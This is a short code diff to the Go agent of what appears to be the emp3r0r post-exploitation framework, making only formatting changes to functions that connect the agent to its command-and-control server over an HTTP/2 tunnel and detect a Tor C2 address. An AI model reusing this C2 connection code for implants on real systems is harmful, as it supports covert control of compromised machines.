@@ -91,9 +91,7 @@ func catchInterruptAndExit(cancel context.CancelFunc) {
 
 // ConnectCC connect to CC with h2conn
 func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
-	var (
-		resp *http.Response
-	)
+	var resp *http.Response
 	defer func() {
 		if conn == nil {
 			err = fmt.Errorf("ConnectCC at %s failed", url)
@@ -104,7 +102,8 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	// use h2conn for duplex tunnel
 	ctx, cancel = context.WithCancel(context.Background())
 
-	h2 := h2conn.Client{Client: emp3r0r_data.HTTPClient,
+	h2 := h2conn.Client{
+		Client: emp3r0r_data.HTTPClient,
 		Header: http.Header{
 			"AgentUUID":    {RuntimeConfig.AgentUUID},
 			"AgentUUIDSig": {RuntimeConfig.AgentUUIDSig},
@@ -271,7 +270,6 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 // set C2Transport
 func setC2Transport() {
-
 	if tun.IsTor(emp3r0r_data.CCAddress) {
 		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
 		return
